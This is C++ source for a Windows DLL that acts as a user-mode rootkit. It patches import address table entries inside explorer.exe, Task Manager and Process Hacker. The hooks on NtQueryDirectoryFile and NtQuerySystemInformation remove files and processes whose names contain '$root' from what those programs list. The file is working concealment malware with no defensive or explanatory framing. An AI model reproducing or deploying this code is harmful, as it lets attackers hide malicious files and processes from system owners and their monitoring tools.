#include"struct.h"
#include"hideModule.h"
#include"PEstruct64.h"
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
#include<Psapi.h>

LONG64* g_querysysteminformation_iat = nullptr;
LONG64* g_querydirectoryfile_iat = nullptr;
LONG64 g_querysysteminformation_addr = NULL;
LONG64 g_querydirectoryfile_addr = NULL;


WCHAR currentProcessName[MAX_PATH] = { 0 };
WCHAR CompRules[] = L"$root";

LONG64* findIATaddr(LPCSTR base, LPCSTR dllname, LPCSTR funcname);

typedef NTSTATUS(WINAPI* LPNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* LPNtQueryDirectoryFile)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
typedef NTSTATUS(WINAPI* LPNtQueryDirectoryFileEx)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID  ApcContext, PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation, ULONG  Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG  QueryFlags, PUNICODE_STRING FileName);

LPNtQueryDirectoryFile lpsourceQueryFile = (LPNtQueryDirectoryFile)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryDirectoryFile");
LPNtQuerySystemInformation lpsourceQuerySysteminformation = (LPNtQuerySystemInformation)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQuerySystemInformation");
LPNtQueryDirectoryFileEx lpsourceQueryFileEx = (LPNtQueryDirectoryFileEx)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryDirectoryFileEx");

NTSTATUS WINAPI hookNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
	NTSTATUS ntStatus = lpsourceQueryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && ntStatus == STATUS_SUCCESS) {
		PFILE_ID_BOTH_DIR_INFORMATION lpCurrentDirectory;
		PFILE_ID_BOTH_DIR_INFORMATION lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;

		do {
			lpCurrentDirectory = lpNextDirectory;
			lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD_PTR)lpCurrentDirectory + lpCurrentDirectory->NextEntryOffset);

			if (StrStrIW(lpNextDirectory->FileName, CompRules)) {

				if (lpNextDirectory->NextEntryOffset == 0) {
					lpCurrentDirectory->NextEntryOffset = 0;
					lpNextDirectory = lpCurrentDirectory;
					break;
				}
				else {
					lpCurrentDirectory->NextEntryOffset += lpNextDirectory->NextEntryOffset;
					lpNextDirectory = lpCurrentDirectory;
				}
			}
		} while (lpCurrentDirectory->NextEntryOffset != 0);
	}

	return ntStatus;
}

NTSTATUS WINAPI hookNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {

	NTSTATUS ntStatus = lpsourceQuerySysteminformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemInformationClass == _SYSTEM_INFORMATION_CLASS::SystemProcessInformation && ntStatus == STATUS_SUCCESS) {
		PSYSTEM_PROCESS_INFORMATION lpCurrentProcess;
		PSYSTEM_PROCESS_INFORMATION lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		do
		{
			lpCurrentProcess = lpNextProcess;
			lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)lpCurrentProcess + lpCurrentProcess->NextEntryOffset);

			if (StrStrIW(lpNextProcess->ImageName.Buffer, CompRules)) {

				if (lpNextProcess->NextEntryOffset == 0) {
					lpCurrentProcess->NextEntryOffset = 0;
					lpNextProcess = lpCurrentProcess;
					break;
				}
				else {
					lpCurrentProcess->NextEntryOffset += lpNextProcess->NextEntryOffset;
					lpNextProcess = lpCurrentProcess;
				}
			}

		} while (lpCurrentProcess->NextEntryOffset != 0);
	}

	return ntStatus;
}

NTSTATUS WINAPI hookNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName) {
	NTSTATUS ntStatus = lpsourceQueryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName);
	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && ntStatus == STATUS_SUCCESS) {
		PFILE_ID_BOTH_DIR_INFORMATION lpCurrentDirectory;
		PFILE_ID_BOTH_DIR_INFORMATION lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;

		do {
			lpCurrentDirectory = lpNextDirectory;
			lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD_PTR)lpCurrentDirectory + lpCurrentDirectory->NextEntryOffset);

			if (StrStrIW(lpNextDirectory->FileName, CompRules)) {

				if (lpNextDirectory->NextEntryOffset == 0) {
					lpCurrentDirectory->NextEntryOffset = 0;
					lpNextDirectory = lpCurrentDirectory;
					break;
				}
				else {
					lpCurrentDirectory->NextEntryOffset += lpNextDirectory->NextEntryOffset;
					lpNextDirectory = lpCurrentDirectory;
				}
			}
		} while (lpCurrentDirectory->NextEntryOffset != 0);
	}

	return ntStatus;
}

LONG64* findIATaddr(LPCSTR base, LPCSTR dllname, LPCSTR funcname) {

	HMODULE procbase = GetModuleHandleA(base);
	struct dosHeader64* dos = (dosHeader64*)(BYTE*)(procbase);
	struct standardPE64* sdpe = (standardPE64*)((BYTE*)(procbase)+((dos->e_lfanew) + 4));
	struct optionalPE64* op = (optionalPE64*)((BYTE*)(procbase)+((dos->e_lfanew) + 24));
	imageDataDirectory datadirectory = op->datadirectory[1];
	importtable64* import64 = (importtable64*)(datadirectory.VirtualAddress + (LONGLONG)procbase);
	while (import64->characteristics) {
		char* name = (char*)(import64->name + (LONGLONG)procbase);

		if (lstrcmpiA(name, dllname) == 0) {

			imagethunkdata64* pint = (imagethunkdata64*)(import64->originalFirstThunk + (LONGLONG)procbase);
			imagethunkdata64* piat = (imagethunkdata64*)(import64->firstthunk + (LONGLONG)procbase);
			while (pint->u1.Function) {
				if (((pint->u1.Function) & 0x80000000) == 0) {
					image_thunk_by_name* pname = (image_thunk_by_name*)((pint->u1.Function) + (LONGLONG)procbase);

					if (strcmp((char*)pname->name, funcname) == 0) {

						return (LONG64*)piat;
					}
				}
				pint++;
				piat++;
			}
		}
		import64++;
	}
	return nullptr;
}



BOOL installHook(LONG64* iatAddr, LONG64 hookFunc) {
	DWORD oldProtect = 0;
	if (!VirtualProtect(iatAddr, sizeof(LONG64), PAGE_READWRITE, &oldProtect)) {
		return FALSE;
	}
	*iatAddr = hookFunc;

	if (!VirtualProtect(iatAddr, sizeof(LONG64), oldProtect, &oldProtect)) {
		return FALSE;
	}
	return TRUE;
}

BOOL uninstallHook(LONG64* iatAddr, LONG64 sourceFuncAddr) {

	return installHook(iatAddr, sourceFuncAddr);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH: {

		HMODULE hmodule = GetModuleHandle(L"hook.dll.dll");
		if (hmodule != NULL) {
			DisableThreadLibraryCalls(hmodule);
		}
		RtlZeroMemory(currentProcessName, sizeof(WCHAR) * MAX_PATH);
		GetModuleBaseName(GetCurrentProcess(), NULL, currentProcessName, sizeof(WCHAR) * MAX_PATH);

		//hideModule("hook.dll.dll"); // If the module is hidden, it cannot be uninstalled in the normal way

		OutputDebugString(currentProcessName);


		if (lstrcmpiW(currentProcessName, L"explorer.exe") == 0) {

			LONG64* querydirIAT = findIATaddr("windows.storage.dll", "ntdll.dll", "NtQueryDirectoryFile");
			g_querydirectoryfile_iat = querydirIAT;//hidefiles
			g_querydirectoryfile_addr = *querydirIAT;

			installHook(querydirIAT, (LONG64)hookNtQueryDirectoryFile);
			break;
		}
		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {
			LONG64* querysysIAT = findIATaddr(NULL, "ntdll.dll", "NtQuerySystemInformation");//hideprocess
			g_querysysteminformation_iat = querysysIAT;
			g_querysysteminformation_addr = *querysysIAT;

			installHook(querysysIAT, (LONG64)hookNtQuerySystemInformation);
			break;
		}
		else {
			return TRUE;
		}
		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:

		RtlZeroMemory(currentProcessName, sizeof(WCHAR) * MAX_PATH);
		GetModuleBaseName(GetCurrentProcess(), NULL, currentProcessName, sizeof(WCHAR) * MAX_PATH);
		if (lstrcmpiW(currentProcessName, L"explorer.exe") == 0) {
			uninstallHook(g_querydirectoryfile_iat, g_querydirectoryfile_addr);
		}
		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe")==0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {
			uninstallHook(g_querysysteminformation_iat, g_querysysteminformation_addr);
		}
		else {
			break;
		}
		break;
	}
	return TRUE;
}

